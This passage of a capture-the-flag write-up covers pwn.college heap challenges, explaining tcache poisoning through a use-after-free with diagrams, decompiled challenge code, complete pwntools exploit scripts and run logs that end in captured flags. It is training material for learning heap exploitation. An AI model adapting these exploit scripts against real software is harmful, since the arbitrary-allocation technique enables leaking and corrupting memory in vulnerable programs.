┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

Then we use the `scanf` command and read the the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 

We can overwrite this with the address of the secret.
This would cause the chunk `B` to be removed from the singly-linked list, and the memory at the secret address would take it's place.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│  next: &SECRET   │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
                         │
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
┆  tcache_entry B  ┆     │
├──────────────────┤     │
│    next: NULL    │     │
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET      ┆
├──────────────────┤
│   next: secret   │ 
├──────────────────┤
│    key: ....     │ 
└──────────────────┘
```

Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET` would be allocated because to `tcache_perthread_struct`, those are the two free chunks. And the first 8 bytes of the `SECRET` chunk would hold the secret value.

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 0    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: NULL ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│  next: &SECRET   │ 
├──────────────────┤  
│    key: NULL     │ 
└──────────────────┘  


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆      SECRET      ┆
├──────────────────┤
│   next: secret   │ 
├──────────────────┤
│    key: NULL     │ 
└──────────────────┘
```

We just have to call puts on this chunk and get the value.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-secrets-easy", level='error')

# 1. Capture the target address
p.recvuntil(b"secret stored at ")
addr_hex = p.recvuntil(b".").strip(b".").decode()
secret_addr = int(addr_hex, 16)
print(f"[*] Target Secret Address: {hex(secret_addr)}")

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"3")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"puts")
p.sendline(b"3")
leak_text = p.recvuntil(b"Data: ").decode()
secret = p.recvline().strip().decode()
print(f"{leak_text}{secret}")

p.sendline(b"send_flag")
p.sendline(secret.encode())
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-secrets-easy:/$ python ~/script.py
###
### Welcome to /challenge/seeking-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x423266.
If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x17e5f2c0

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[1] = malloc(128)
[*] allocations[1] = 0x17e5f350

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x17e5f350           | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x17e5f350          | 0                   | 0x91 (P)                     | (nil)               | 0x17e5f010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x17e5f2c0           | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x17e5f2c0          | 0                   | 0x91 (P)                     | 0x17e5f350          | 0x17e5f010          |
| 0x17e5f350          | 0                   | 0x91 (P)                     | (nil)               | 0x17e5f010          |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
[*] scanf("%136s", allocations[0])

+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x17e5f2c0           | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x17e5f2c0          | 0                   | 0x91 (P)                     | 0x423266            | 0x17e5f000          |
| 0x423266            | 0                   | 0 (NONE)                     | 0x68677a7072687266  | (nil)               |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[0] = malloc(128)
[*] allocations[0] = 0x17e5f2c0
+====================+========================+==============+============================+============================+
| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x423266             | KEY: 0x17e5f010            |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x423266            | 0                   | 0 (NONE)                     | 0x68677a7072687266  | (nil)               |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 
[*] allocations[1] = malloc(128)
[*] allocations[1] = 0x423266

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Index: 
[*] puts(allocations[1])
Data: frhrpzgh

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{0jM840YHF5jL79Sl0oYvY6T92Nt.0VM4MDL4ITM0EzW}
```

&nbsp;

## Seeking Secrets (Hard)

```
hacker@dynamic-allocator-misuse~seeking-secrets-hard:~$ /challenge/seeking-secrets-hard 
###
### Welcome to /challenge/seeking-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
```

### Binary Analysis

```c title="/challenge/seeking-secrets-hard :: main()" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+30h] [rbp-120h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 7; ++i )
    byte_422961[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_40214C);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_40214C);
            size = atoi(choice);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_40214C);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_40214C);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_40214C);
      v9 = atoi(choice);
      if ( v9 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
      v3 = malloc_usable_size(ptr[v9]);
      sprintf(choice, "%%%us", v3);
      __isoc99_scanf(choice, ptr[v9]);
      puts(byte_40214C);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_40214C);
    if ( !memcmp(choice, byte_422961, 8uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

The solution for this level remains the same as the easy one.

### Exploit 

```py title="~/script.py" showLineNumbers
from pwn import *

p = process("/challenge/seeking-secrets-hard", level='error')

secret_addr = 0x422961

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"malloc")
p.sendline(b"3")
p.sendline(b"128")
print(p.recvuntil(b"quit):").decode())

p.sendline(b"puts")
p.sendline(b"3")
p.recvuntil(b"Data: ")
secret = p.recvline().strip().decode()
print(f"[*] Leaked Secret: {secret}")

p.sendline(b"send_flag")
p.sendline(secret.encode()) 
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-secrets-hard:/$ python ~/script.py
###
### Welcome to /challenge/seeking-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit):
 
Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit):
[*] Leaked Secret: ipubljho

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Secret: 
Authorized!
You win! Here is your flag:
pwn.college{smCm7JHRquJbXskS-KlEMuZeUe5.0lM4MDL4ITM0EzW}
```

&nbsp;

## Seeking Substantial Secrets (Easy)

### Binary Analysis

```c title="/challenge/seeking-substantial-secrets-easy :: main()" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_429964[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  printf("In this challenge, there is a secret stored at %p.\n", byte_429964);
  puts("If you can leak out this secret, you can redeem it for the flag.\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_tcache(main_thread_tcache);
            puts(byte_4035BA);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", s1);
            puts(byte_4035BA);
            if ( strcmp(s1, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_4035BA);
            v7 = atoi(s1);
            if ( v7 > 0xF )
              __assert_fail("allocation_index < 16", "<stdin>", 0x117u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_4035BA);
            size = atoi(s1);
            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
            ptr[v7] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
          }
          if ( strcmp(s1, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_4035BA);
          v8 = atoi(s1);
          if ( v8 > 0xF )
            __assert_fail("allocation_index < 16", "<stdin>", 0x129u, "main");
          printf("[*] free(allocations[%d])\n", v8);
          free(ptr[v8]);
        }
        if ( strcmp(s1, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_4035BA);
        v9 = atoi(s1);
        if ( v9 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x136u, "main");
        printf("[*] puts(allocations[%d])\n", v9);
        printf("Data: ");
        puts((const char *)ptr[v9]);
      }
      if ( strcmp(s1, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_4035BA);
      v10 = atoi(s1);
      if ( v10 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 0x143u, "main");
      v3 = malloc_usable_size(ptr[v10]);
      sprintf(s1, "%%%us", v3);
      v4 = malloc_usable_size(ptr[v10]);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
      __isoc99_scanf(s1, ptr[v10]);
      puts(byte_4035BA);
    }
    if ( strcmp(s1, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", s1);
    puts(byte_4035BA);
    if ( !memcmp(s1, byte_429964, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

### Exploit

```py
from pwn import *

p = process("/challenge/seeking-substantial-secrets-easy", level='error')

# 1. Capture the target address
p.recvuntil(b"secret stored at ")
addr_hex = p.recvuntil(b".").strip(b".").decode()
secret_addr = int(addr_hex, 16)
print(f"[*] Target Secret Address: {hex(secret_addr)}")

# --- LEAK PART 1 (First 8 Bytes) ---
p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"1")
# Use ljust to ensure we have 8 bytes even if puts hits a null early
p.recvuntil(b"Data: ")
part1 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 1: {part1}")
print(p.recvuntil(b"quit): ").decode())

# --- LEAK PART 2 (Second 8 Bytes) ---
# We free Index 2 (real heap) to reuse the bin. We DO NOT free Index 3.
p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison Index 2 to point to the second half
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr + 8))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"2")
p.recvuntil(b"Data: ")
part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 2: {part2}")
print(p.recvuntil(b"quit): ").decode())

# --- SUBMIT ---
full_secret = part1 + part2
p.sendline(b"send_flag")
p.sendline(full_secret)
print(p.recvuntil(b"}").decode())
```

&nbsp;

## Seeking Substantial Secrets (Hard)

### Binary Analysis

```c title="/challenge/seeking-substantial-secrets-hard :: main()" showLineNumbers 
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v6; // [rsp+30h] [rbp-120h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 15; ++i )
    byte_427051[i] = rand() % 26 + 97;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_40214C);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", s1);
            puts(byte_40214C);
            if ( strcmp(s1, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_40214C);
            v6 = atoi(s1);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", s1);
            puts(byte_40214C);
            size = atoi(s1);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(s1, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_40214C);
          v7 = atoi(s1);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(s1, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", s1);
        puts(byte_40214C);
        v8 = atoi(s1);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(s1, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", s1);
      puts(byte_40214C);
      v9 = atoi(s1);
      if ( v9 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
      v3 = malloc_usable_size(ptr[v9]);
      sprintf(s1, "%%%us", v3);
      __isoc99_scanf(s1, ptr[v9]);
      puts(byte_40214C);
    }
    if ( strcmp(s1, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", s1);
    puts(byte_40214C);
    if ( !memcmp(s1, byte_427051, 16uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

### Exploit

```py
from pwn import *

p = process("/challenge/seeking-substantial-secrets-hard", level='error')

secret_addr = 0x427051

# --- LEAK PART 1 (First 8 Bytes) ---
p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"1")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"1")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"1")
# Use ljust to ensure we have 8 bytes even if puts hits a null early
p.recvuntil(b"Data: ")
part1 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 1: {part1}")
print(p.recvuntil(b"quit): ").decode())

# --- LEAK PART 2 (Second 8 Bytes) ---
# We free Index 2 (real heap) to reuse the bin. We DO NOT free Index 3.
p.sendline(b"free")
p.sendline(b"0")
print(p.recvuntil(b"quit): ").decode())

# Poison Index 2 to point to the second half
p.sendline(b"scanf")
p.sendline(b"0")
p.sendline(p64(secret_addr + 8))
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"0")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"malloc")
p.sendline(b"2")
p.sendline(b"128")
print(p.recvuntil(b"quit): ").decode())

p.sendline(b"puts")
p.sendline(b"2")
p.recvuntil(b"Data: ")
part2 = p.recvline().strip().ljust(8, b"\x00")[:8]
print(f"Part 2: {part2}")
print(p.recvuntil(b"quit): ").decode())

# --- SUBMIT ---
full_secret = part1 + part2
p.sendline(b"send_flag")
p.sendline(full_secret)
print(p.recvuntil(b"}").decode())
```

```
hacker@dynamic-allocator-misuse~seeking-substantial-secrets-hard:/$ python ~/script.py
###
### Welcome to /challenge/seeking-substantial-secrets-hard!
###


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Part 1: b'zhffdxpe'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 


[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Index: 
Size: 

[*] Function (malloc/free/puts/scanf/send_flag/quit): 
Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'

[*] Function (malloc/free/puts/scanf/send_flag/quit): 

Secret: 
Authorized!
You win! Here is your flag:
pwn.college{Y1obx4BDBPfdkgWr6FXdTlE7-n5.0FN4MDL4ITM0EzW}
```